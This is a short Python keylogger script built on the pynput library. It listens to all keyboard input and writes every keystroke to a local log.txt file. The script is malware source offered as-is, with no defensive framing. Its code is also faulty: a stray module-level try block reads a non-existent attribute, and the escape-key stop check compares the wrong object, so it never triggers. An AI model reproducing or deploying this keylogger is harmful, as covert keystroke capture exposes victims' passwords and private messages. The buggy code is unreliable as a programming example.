import pynput   #(pynout to control and monitor input devices)
from pynput.keyboard import Key, Listener
Keys= []

def on_press(Key):
    Keys.append(Key)
    write_file(Keys)

try:
     print('alphanumeric key {0} pressed'.format(Key.char))   
except AttributeError:
    print('special Key {0} pressed'. format(Key)) 
    

def write_file(keys):
    with open('log.txt', 'w') as f:
 
        for key in keys:
         k= str(key). replace("'"," ")
         f.write(k)
            
        f.write(' ')
                 
def on_released(key):
     print('{0} released'. format(key))
     if Key == Key.esc :
         return False
        
with Listener(on_press=on_press,
              on_release=on_released ) as Listener:
     Listener.join() 

